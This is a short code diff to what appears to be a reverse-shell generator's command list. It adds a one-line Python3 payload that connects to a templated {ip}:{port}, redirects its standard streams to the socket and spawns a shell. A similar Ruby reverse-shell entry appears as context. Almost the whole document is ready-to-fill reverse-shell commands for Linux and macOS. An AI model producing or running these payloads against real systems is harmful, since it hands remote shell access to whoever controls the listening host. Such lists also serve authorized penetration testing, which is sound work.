@@ -199,6 +199,11 @@ const reverseShellCommands = withCommandType(
             "meta": ["linux", "mac"]
         },
         {
+            "name": "Python3 shortest",
+            "command": "python3 -c'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"{shell}\")'",
+            "meta": ["linux"]
+        },
+        {
             "name": "Ruby #1",
             "command": "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"{shell} -i <&%d >&%d 2>&%d\",f,f,f)'",
             "meta": ["linux", "mac"]
